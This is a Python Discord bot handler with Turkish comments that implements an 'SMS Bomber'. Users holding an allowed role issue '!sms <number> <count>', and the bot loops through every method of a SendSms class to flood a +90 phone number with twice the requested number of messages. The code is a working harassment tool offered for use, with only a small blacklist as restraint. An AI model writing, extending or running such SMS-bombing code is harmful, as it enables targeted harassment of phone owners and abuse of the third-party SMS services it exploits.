@client.event
async def on_message(message):
    # Botun kendi mesajlarına tepki vermemesi için kontrol ekleyin
    if message.author == client.user:
        return

    # İzin verilen roldeki kullanıcıların mesajlarını işle
    if allowed_role in [role.name for role in message.author.roles]:
        if message.content == "!bot-durdur":
            await stop_bot(message)
        elif message.content == "!bot-baslat":
            await start_bot(message)
        elif len(message.content.split(" ")) == 3 and message.content.split(" ")[0] == "!sms":
            telno = message.content.split(" ")[1]
            adet = int(message.content.split(" ")[2])  # Kullanıcı tarafından belirlenen adet
            if len(telno) == 10:
                # Eğer numara kara listedeyse gönderme
                if telno in blacklist:
                    await message.channel.send(f"Bu numaraya SMS göndermek engellenmiştir.\n{message.author.mention}")
                    return
                
                adet *= 2  # Kullanıcının girdiği sayının iki katını al
                embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff)
                embed.set_thumbnail(url=gif)
                await message.channel.send(embed=embed)
                sms = SendSms(telno, "")
                while sms.adet < adet:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == adet:
                                    break
                                exec("sms."+attribute+"()")
                                sleep(saniye)
                await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")                        
            else:
                await message.channel.send(f"Geçerli komut yazınız!\nYardım için '!help' yazınız.\n{message.author.mention}")
        elif "!help" == message.content:
            await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```!sms 5313313131 10```\n!sms (telefon numarası) (adet)\n{message.author.mention}")
        else:
            pass
    else:
        await message.channel.send("Bu komutu kullanmak için gerekli izne sahip değilsiniz.\n{message.author.mention}")
